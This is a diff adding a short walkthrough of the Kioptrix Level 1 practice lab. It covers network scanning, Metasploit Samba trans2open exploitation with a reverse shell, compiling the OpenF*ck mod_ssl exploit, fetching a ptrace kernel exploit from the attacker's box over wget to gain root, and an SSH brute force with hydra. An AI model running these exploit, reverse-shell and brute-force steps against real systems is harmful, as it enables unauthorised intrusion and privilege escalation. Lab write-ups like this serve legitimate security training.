@@ -1,0 +1,87 @@
+# Kioptrix Level 1
+
+## Receon & Enumeration
+
+netdiscover -i eth1 -r 192.168.xxx.0/24
+nmap -sP 192.168.xxx.0/24
+nmap -sS -A -n <ipaddr>
+nikto -host <ipaddr>
+
+
+## Samba
+### Find what Samba version with Metasploit
+msfconsole
+use auxiliary/scanner/smb/smb_version
+show options
+set RHOST 192.168.56.110
+
+This returned Samba 2.2.1a
+
+### Attacking using Metasploit
+msfconsole
+use exploit/linux/samba/trans2open
+show options
+set RHOSTS 192.168.56.110
+set payload linux/x86/shell_reverse_tcp
+set LHOST 192.168.56.107
+exploit
+
+
+### Attacking using Exploit Code (OpenF*ck)
+searchsploit samba 2.2
+
+This looks like the best fit...
+Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
+
+Compile it...
+gcc 10.c -o sploit
+chmod +x sploit
+
+run it...
+./sploit -b0 192.168.56.110
+
+
+
+
+## Apache & SSL
+searchsploit mod_ssl
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenF*ckV2.c' Remote Buffer Overflow (1)
+
+Updating OpenF*ck to work in present day...
+http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/
+
+Also, back rev'ing the SSL libs...
+apt-get install libssl1.0-dev
+
+cp /usr/share/exploitdb/exploits/unix/remote/764.c ./.
+(update the code
+gcc -o 764 764.c -lcrypto
+
+First time failed...
+./764 0x6a 192.168.56.110   
+
+Second time worked!
+./764 0x6b 192.168.56.110
+
+Everything worked...but the part of the code to pull
+down a vuln to escate privelges from apache to root failed.
+
+pulled the code down manually to my box, and served it over to target
+
+http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+
+python -m SimpleHTTPServer 8000
+
+wget http://<my box ip>:8000/ptrace-kmod.c
+
+gcc -o ptrace-kmod ptrace-kmod.c
+chmod +x ptrace-kmod
+./ptrace-kmod
+
+Boom! Root!
+
+
+## SSH
+Could not find a valid exploit. Went the bruteforce method instead...
+
+hydra -l root -P rockyou.txt -t 4 -o login.pwd 192.168.56.110 ssh
